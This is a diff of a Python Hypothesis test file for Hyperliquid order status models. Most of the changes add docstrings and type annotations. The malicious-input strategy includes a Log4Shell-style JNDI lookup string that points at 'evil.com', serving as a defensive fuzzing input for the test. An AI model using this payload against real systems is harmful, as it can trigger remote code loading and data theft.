@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw order status models.
 
 These tests validate critical security boundary models that process external order status data.
-The models tested here are essential for order tracking, execution monitoring, and position management.
+The models tested here are essential for order tracking, execution, and position management.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious order status data that could manipulate trading decisions
@@ -30,13 +30,21 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_open_orders import (
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR ORDER STATUS MODEL TESTING
 # =============================================================================
 
 
 def decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for prices and amounts."""
+    """Generate valid decimal strings for prices and amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -57,7 +65,11 @@ def decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def positive_decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid positive decimal strings."""
+    """Generate valid positive decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -70,7 +82,11 @@ def positive_decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def coin_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid coin symbols."""
+    """Generate valid coin symbols.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ATOM", "DOT"]),
         st.text(
@@ -84,12 +100,20 @@ def coin_symbol_strategy() -> SearchStrategy[str]:
 
 
 def order_side_strategy() -> SearchStrategy[str]:
-    """Generate valid order side values."""
+    """Generate valid order side values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["B", "S", "A"])  # Buy, Sell, Ask
 
 
 def order_status_strategy() -> SearchStrategy[str]:
-    """Generate valid order status values."""
+    """Generate valid order status values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from([
         "open",
         "filled",
@@ -104,17 +128,29 @@ def order_status_strategy() -> SearchStrategy[str]:
 
 
 def tif_strategy() -> SearchStrategy[str]:
-    """Generate valid TIF (Time In Force) values."""
+    """Generate valid TIF (Time In Force) values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["Gtc", "Ioc", "Alo"])
 
 
 def order_type_strategy() -> SearchStrategy[str]:
-    """Generate valid order type values."""
+    """Generate valid order type values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["limit", "market", "stop", "stop_limit"])
 
 
 def client_order_id_strategy() -> SearchStrategy[str | None]:
-    """Generate valid client order ID strings."""
+    """Generate valid client order ID strings.
+
+    Returns:
+        SearchStrategy[str | None]: Strategy for generating test data.
+    """
     return st.one_of([
         st.none(),  # Optional field
         st.text(
@@ -129,7 +165,11 @@ def client_order_id_strategy() -> SearchStrategy[str | None]:
 
 @st.composite
 def valid_raw_order_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid raw order data."""
+    """Generate valid raw order data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "oid": draw(st.integers(min_value=0, max_value=2**63 - 1)),
         "cloid": draw(client_order_id_strategy()),
@@ -152,7 +192,11 @@ def valid_raw_order_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_order_status_order_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid order status order data."""
+    """Generate valid order status order data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "order": draw(valid_raw_order_data()),
         "status": draw(order_status_strategy()),
@@ -162,15 +206,23 @@ def valid_order_status_order_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_order_status_response_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid order status response data."""
+    """Generate valid order status response data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "status": draw(order_status_strategy()),
         "order": draw(valid_order_status_order_data()),
     }
 
 
-def malicious_order_status_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for order status security testing."""
+def malicious_order_status_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for order status security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Order status manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-orders}"),
@@ -224,7 +276,7 @@ class TestHyperliquidRawOrderStatusResponseProperties:
 
     @given(status_data=valid_order_status_response_data())
     def test_order_status_validation_success_properties(self, status_data: dict[str, Any]) -> None:
-        """Property: Valid order status data should always create valid response objects."""
+        """Property: Valid data should create valid response objects."""
         # Skip invalid data for raw order
         order_data = status_data["order"]["order"]
         assume(isinstance(order_data["oid"], int) and order_data["oid"] >= 0)
@@ -321,10 +373,10 @@ class TestHyperliquidRawOrderStatusResponseProperties:
         malicious_value=malicious_order_status_strategy(),
     )
     def test_order_status_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Order status response should reject malicious inputs safely."""
-        base_data = {
+        """Property: Order status response should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "status": "open",
             "order": {
                 "order": {
@@ -364,7 +416,9 @@ class TestHyperliquidRawOrderStatusResponseProperties:
             st.booleans(),  # Boolean instead of dict
         ])
     )
-    def test_order_status_invalid_order_field_properties(self, invalid_order_field: Any) -> None:
+    def test_order_status_invalid_order_field_properties(
+        self, invalid_order_field: MaliciousInput
+    ) -> None:
         """Property: Order status response should validate order field type."""
         status_data = {
             "status": "open",
